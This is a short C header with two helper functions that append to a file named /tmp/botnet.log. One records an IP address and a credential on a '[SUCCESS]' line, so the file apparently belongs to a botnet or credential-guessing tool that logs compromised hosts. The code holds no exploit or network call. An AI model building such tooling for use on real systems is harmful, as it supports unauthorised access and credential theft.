#ifndef UTILS_H
#define UTILS_H

#include <stdio.h>
#include <string.h>

void log_success(const char *ip, const char *cred) {
    FILE *log = fopen("/tmp/botnet.log", "a");
    fprintf(log, "[SUCCESS] %s:%s\n", ip, cred);
    fclose(log);
}

void log_error(const char *msg) {
    FILE *log = fopen("/tmp/botnet.log", "a");
    fprintf(log, "[ERROR] %s\n", msg);
    fclose(log);
}

#endif
